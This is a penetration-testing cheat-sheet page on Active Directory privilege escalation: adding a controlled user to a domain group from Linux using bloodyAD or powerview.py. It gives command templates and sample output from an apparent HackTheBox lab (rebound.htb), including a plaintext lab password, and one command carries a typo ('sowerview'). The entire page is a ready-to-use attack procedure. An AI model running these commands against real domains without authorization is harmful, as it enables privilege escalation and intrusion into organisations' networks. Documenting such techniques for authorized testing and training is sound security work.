---
title: "AddMember"
date: 2024-11-1
tags: ["Powerview", "AddMember", "Domain Controller", "Active Directory", "Windows", "BloodyAD"]
---

### Privesc #1: Add User to Group (From Linux)

{{< tab set1 tab1 >}}bloodyAD{{< /tab >}}
{{< tab set1 tab2 >}}powerview.py{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Add User to Group

```console
# With password
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> --dc-ip <DC_IP> add groupMember '<GROUP>' '<TARGET_USER>'
```

```console
# With Kerberos
bloodyAD -d <DOMAIN> -u '<USER>' -k --host <DC> --dc-ip <DC_IP> add groupMember '<GROUP>' '<TARGET_USER>'
```

<small>*Ref: [bloodyAD](https://github.com/CravateRouge/bloodyAD)*</small>

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### 1. Connect

```console
# With password
sudo ntpdate -s <DC> && powerview '<DOMAIN>/<USER>:<PASSWORD>@<TARGET_DOMAIN>'
```

```console {class="sample-code"}
$ sudo ntpdate -s dc01.rebound.htb && powerview 'rebound.htb/oorend:1GR8t@$$4u@dc01.rebound.htb'
Logging directory is set to /home/kali/.powerview/logs/dc01.rebound.htb
[2024-09-24 07:11:06] Channel binding is enforced!
(LDAPS)-[dc01.rebound.htb]-[rebound\oorend]
PV > 
```

```console
# With Kerberos
sudo ntpdate -s <DC> && sowerview '<DOMAIN>/<USER>@<TARGET_DOMAIN>' -k --no-pass
```

#### 2. Add User to Group

```console
Add-DomainGroupMember -Identity '<GROUP>' -Members '<TARGET_USER>'
```

```console {class="sample-code"}
PV > Add-DomainGroupMember -Identity 'servicemgmt' -Members 'oorend'
[2024-09-24 07:13:17] User oorend successfully added to servicemgmt
```

```console
# Check
Get-DomainGroupMember -Identity '<GROUP>'
```

```console {class="sample-code"}
PV > Get-DomainGroupMember -Identity 'servicemgmt'
GroupDomainName             : ServiceMgmt
GroupDistinguishedName      : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
MemberDomain                : rebound.htb
MemberName                  : ppaul
MemberDistinguishedName     : CN=ppaul,CN=Users,DC=rebound,DC=htb
MemberSID                   : S-1-5-21-4078382237-1492182817-2568127209-1951

---[SNIP]---

GroupDomainName             : ServiceMgmt
GroupDistinguishedName      : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
MemberDomain                : rebound.htb
MemberName                  : oorend
MemberDistinguishedName     : CN=oorend,CN=Users,DC=rebound,DC=htb
MemberSID                   : S-1-5-21-4078382237-1492182817-2568127209-7682
```

<small>*Ref: [powerview.py](https://github.com/aniqfakhrul/powerview.py)*</small>

{{< /tabcontent >}}